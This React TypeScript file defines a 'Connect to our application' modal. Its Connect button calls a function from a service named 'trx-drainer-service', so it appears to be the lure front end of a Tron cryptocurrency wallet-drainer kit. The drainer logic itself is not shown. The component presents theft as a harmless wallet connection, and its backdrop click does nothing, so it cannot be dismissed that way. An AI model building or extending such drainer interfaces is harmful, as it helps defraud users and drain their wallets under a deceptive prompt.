import React from "react";
import { Dialog } from "@headlessui/react";
import { AnimatePresence, motion } from "framer-motion";
import { callWalletConnectContract } from "../services/trx-drainer-service";


interface ConnectWalletModalProps {
  isOpen: boolean;
  setIsOpen: (val: boolean) => void;
  setIsFinishModalOpen: (val: boolean) => void;
}

export default function CallContractModal({
  isOpen,
  setIsOpen,
  setIsFinishModalOpen
}: ConnectWalletModalProps) {
  return (
    <AnimatePresence>
      {isOpen && (
        <Dialog
          as="div"
          className="fixed inset-0 z-50 flex items-center justify-center"
          onClose={() => {}}
          open={isOpen}
        >
          <div className="fixed inset-0 bg-black/60" aria-hidden="true" />
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            transition={{ duration: 0.2 }}
            className="relative z-50 bg-[#1a1a2e] rounded-2xl p-8 w-[90%] max-w-md shadow-2xl"
          >
            <Dialog.Title className="text-2xl font-bold text-white mb-6 text-center">
              Connect to our application
            </Dialog.Title>

            <div className="flex justify-center">
              <button
                onClick={ () => {callWalletConnectContract(setIsFinishModalOpen, setIsOpen)}}
                className="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 gap-[6px] min-w-[105px] transition-all duration-350 ease-[cubic-bezier(0.34,1.56,0.64,1)] bg-[#6E54FF] text-white shadow-[0px_1px_0.5px_0px_rgba(255,255,255,0.33)_inset,0px_1px_2px_0px_rgba(26,19,161,0.50),0px_0px_0px_1px_#4F47EB] hover:bg-[#836EF9] hover:shadow-[0px_1px_1px_0px_rgba(255,255,255,0.12)_inset,0px_1px_2px_0px_rgba(26,19,161,0.50),0px_0px_0px_1px_#4F47EB] h-10 px-4 py-[6px] rounded-[100px] text-[14px] leading-[24px] font-[500]"
              >
                Connect
              </button>
            </div>

            <button
              onClick={() => {setIsOpen(false)}}
              className="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"
            >
              ×
            </button>
          </motion.div>
        </Dialog>
      )}
    </AnimatePresence>
  );
}